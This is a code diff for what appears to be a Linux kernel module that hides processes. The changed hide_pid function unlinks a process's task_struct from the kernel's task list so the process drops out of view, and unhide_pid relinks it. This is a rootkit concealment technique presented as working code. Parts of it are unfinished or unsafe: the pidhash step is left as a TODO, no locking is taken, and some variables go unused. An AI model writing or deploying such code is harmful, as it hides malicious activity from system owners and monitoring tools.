@@ -1,28 +1,63 @@
 #include <linux/slab.h>
+#include <linux/pid.h>
 
 #include "hidepid.h"
 
 static pid_list_t hidden_pids = {
     .pid  = -1,
+    .task = NULL,
     .prev = NULL,
     .next = NULL,
     .head = NULL,
     .tail = NULL
 };
 
-
+// https://tldp.org/LDP/lki/lki-2.html
 void
 hide_pid(pid_t pid)
 {
+    size_t i;
+    struct pid *spid;
+    struct task_struct *task;
+
     if (list_contains_pid(&hidden_pids, pid))
         return;
 
-    add_pid_to_list(hidden_pids.tail, pid);
+    if (!(spid = find_get_pid(pid)) || !(task = pid_task(spid, PIDTYPE_PID)))
+        return;
+
+    { // unlink from circular DLL of task_structs
+        task->tasks.prev->next = task->tasks.next;
+        task->tasks.next->prev = task->tasks.prev;
+    }
+
+    { // TODO: remove pid from `pidhash`
+    }
+
+    add_pid_to_list(hidden_pids.tail, pid, task);
 }
 
 void
 unhide_pid(pid_t pid)
 {
+    size_t i;
+    struct pid *spid;
+    pid_list_t_ptr node;
+
+    if (!(node = find_pid_in_list(&hidden_pids, pid)))
+        return;
+
+    if (!(spid = get_task_pid(node->task, PIDTYPE_PID)))
+        return;
+
+    { // relink within circular DLL of task_structs
+        node->task->tasks.next->prev = &node->task->tasks;
+        node->task->tasks.prev->next = &node->task->tasks;
+    }
+
+    { // TODO: readd pid to `pidhash`
+    }
+
     remove_pid_from_list(hidden_pids.tail, pid);
 }
 
@@ -70,13 +105,14 @@ find_pid_in_list(pid_list_t_ptr list, pid_t pid)
 }
 
 pid_list_t_ptr
-add_pid_to_list(pid_list_t_ptr tail, pid_t pid)
+add_pid_to_list(pid_list_t_ptr tail, pid_t pid, struct task_struct *task)
 {
     pid_list_t_ptr node;
-    node = (pid_list_t_ptr)kzalloc(sizeof(pid_list_t), GFP_KERNEL);
+    node = (pid_list_t_ptr)kmalloc(sizeof(pid_list_t), GFP_KERNEL);
 
     if (node) {
         node->pid = pid;
+        node->task = task;
         node->next = NULL;
         node->prev = tail;
         tail->next = node;
